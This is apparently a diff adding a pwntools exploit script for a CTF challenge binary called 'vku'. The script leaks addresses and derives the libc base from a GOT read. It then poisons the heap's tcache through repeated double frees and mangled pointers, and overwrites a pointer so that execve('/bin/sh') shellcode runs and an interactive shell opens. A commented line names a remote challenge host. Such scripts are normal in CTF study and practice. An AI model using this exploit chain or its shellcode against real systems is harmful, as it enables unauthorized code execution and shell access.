@@ -1,0 +1,151 @@
+#!/usr/bin/env python3
+from pwn import *
+exe = ELF("vku")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+context.binary = exe
+context.log_level='debug'
+# info = lambda msg: log.info(msg)
+# sla = lambda msg, data: p.sendlineafter(msg, data)
+# sa = lambda msg, data: p.sendafter(msg, data)
+# sl = lambda data: p.sendline(data)
+# s = lambda data: p.send(data)
+# slan = lambda msg, num: sla(msg, str(num).encode())
+# san = lambda msg, num: sa(msg, str(num).encode())
+# sln = lambda num: sl(str(num).encode())
+# sn = lambda num: s(str(num).encode())
+# r = lambda nbytes: p.recv(nbytes)
+# ru = lambda data: p.recvuntil(data)
+# rl = lambda : p.recvline()
+
+# def GDB():
+#     if not args.REMOTE:
+#         gdb.attach(p, gdbscript=f'''
+#         c
+#         ''')
+
+# if args.REMOTE:
+#     conn = 'nc 14.225.212.104 9003'.split()
+#     p = remote(conn[1], int(conn[2]))
+# else:
+#     p = process(exe.path)
+
+import sys
+def align_16(addr):
+    return (addr + 15) & ~15
+while True:
+    p = process(["sh", "run.sh"])
+    # p = remote("127.0.0.1",9003)
+    # p = remote("14.225.212.104", 9003)
+    try:
+        script="""
+        gdbsync start
+        """
+        def GDB():
+            gdb.attach(p, gdbscript=script)
+            input("enter to continue-> ")
+            # p = gdb.debug([exe.path], gdbscript=script)
+            # return p
+        sla = lambda msg, data: p.sendlineafter(msg, data)
+        sa = lambda msg, data: p.sendafter(msg, data)
+        sl = lambda data: p.sendline(data)
+        s = lambda data: p.send(data)
+        shell = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+        # sla("(max 100 chars):", shell)
+        
+        sla("(max 100 chars):", b"lmaodarkenv")
+
+        sla(":", "1337")
+        p.recvuntil('Binary Base : ')
+        exe.address = int(p.recvuntil("\n"), 0)
+        print(f"{hex(exe.address) = }")
+        p.recvuntil("Heap Base   : ")
+        heap = int(p.recvuntil("\n"), 0)
+        print(f"{hex(heap) = }")
+        p.recvuntil("Stack Base  : ")
+        stack_ = align_16(int(p.recvuntil("\n"), 0))
+        print(f"{hex(stack_) = }")
+
+        sla("ss to read (hex):", hex(exe.got.setbuf)[2:])
+        sla("th (hex):", "8")
+        p.recvuntil("Data (Hexdump): \n")
+
+        data = p.recvuntil("\n").split()
+        data.reverse()
+
+        libc.address = int(b"0x" + b"".join(data), 0) - libc.sym.setbuf
+
+        print(f"{hex(libc.address) = }")
+
+        def add_lecture(name, age):
+            p.recvuntil(" Welcome to VKU University Management System")
+            sla(":", "1")
+            sla("Name :", name)
+            sla("Age :", str(age))
+
+        def add_student(name, age):
+            p.recvuntil(" Welcome to VKU University Management System")
+            sla(":", "2")
+            sla("Name :", name)
+            sla("Age :", str(age))   
+
+        def show(idx):
+            p.recvuntil(" Welcome to VKU University Management System")
+            sla(":", "4")
+            sla("Index:", str(idx))
+
+        def delete(idx):
+            p.recvuntil(" Welcome to VKU University Management System")
+            sla(":", "5")
+            sla("dex:", str(idx))
+
+        # sla(" (max 100 chars):", asm(shellcraft.sh()))
+        sla(":", "4")
+        firsttime = b"lmaodark" +  p64(stack_ + 0xc) * 2 
+        sa("please enter your name:", firsttime)
+        
+        add_student(b"a", 10)
+        add_student(b"b", 20)
+        add_student(b"c", 30)
+        add_student(b"d", 40)
+        
+        delete(2)
+        delete(1)
+        delete(1)
+        delete(0)
+
+        ptr = heap+0x12590
+        def protect(ptr1,ptr2):
+            return ptr1^(ptr2>>12)
+        align_ptr = p64(protect(stack_, ptr))
+        print(f"{hex(u64(align_ptr.ljust(8, b'\0'))) = }")
+        add_student(b"a" * 0x44 + align_ptr, 935) #0
+        for i in range(7):
+            delete(0)
+            add_student(b"a" * (0x3c + 6 - i) + p64(0x31), 936) #1
+        # delete(0)
+        for i in range(8):
+            delete(0)
+            add_student(b"a" * (0x1c + 7 - i) + p64(0x21), 936) #1
+        add_student(b"a" * 23, 936) #2
+        # payload = shell 
+        add_lecture(shell, 937) # 3
+        delete(0)
+        add_lecture(b"a" * 0x44 + p64(exe.address + 0x82e8), 1)
+        GDB()
+        show(0)
+        sl("echo lmaodark")
+        try:
+            p.recvuntil("lmaodark")
+            p.interactive()
+            p.close()
+            break
+        except:
+            pass
+    except Exception as e:
+        print(e)
+    p.interactive()
+    p.close()
+    break
+
+
